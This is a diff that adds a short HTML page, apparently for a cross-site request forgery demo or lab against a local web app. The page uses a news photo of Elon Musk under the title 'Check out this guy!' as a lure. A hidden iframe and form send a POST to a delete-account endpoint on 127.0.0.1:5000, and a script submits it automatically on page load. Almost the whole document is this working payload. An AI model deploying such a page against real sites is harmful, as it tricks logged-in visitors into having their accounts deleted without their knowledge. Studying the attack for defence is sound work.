@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Check out this guy!</title>
+</head>
+<body>
+    <img src="https://ichef.bbci.co.uk/ace/branded_news/1200/cpsprodpb/7727/production/_103330503_musk3.jpg" alt="Elon Musk">
+    
+    <iframe name="csrf-frame" style="display:none;"></iframe>
+    <form id="csrfForm" method="POST" action="http://127.0.0.1:5000/delete-account" target="csrf-frame">
+    </form>
+
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
